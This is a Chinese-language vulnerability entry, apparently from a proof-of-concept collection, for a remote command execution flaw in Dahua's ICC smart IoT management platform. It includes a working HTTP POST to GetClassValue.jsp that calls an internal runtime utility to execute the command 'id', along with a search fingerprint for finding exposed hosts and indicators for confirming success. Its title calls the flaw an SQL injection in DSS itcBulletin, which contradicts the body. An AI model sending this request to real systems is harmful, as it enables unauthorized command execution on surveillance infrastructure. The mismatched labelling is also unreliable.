﻿# 大华 DSS itcBulletin SQL 注入漏洞

> 更新时间：2025-01-03

> 漏洞编号：

> 漏洞说明：大华智能物联综合管理平台(ICC) 存在远程命令执行漏洞

> 漏洞特征：body="客户端会小于800"

> 验证脚本：HTTP

```
POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
Content-Type: application/json
Content-Length: 121

{
    "data": {
        "clazzName": "com.dahua.admin.util.RuntimeUtil",
        "methodName": "syncexecReturnInputStream",
        "fieldName": ["id"]
    }
}

```

> 响应代码特征：200

> 响应内容特征：Success

> 上传文件定位：


> 验证文件来源：大华 智能物联综合管理平台(ICC) GetClassValue存在 远程命令执行漏洞
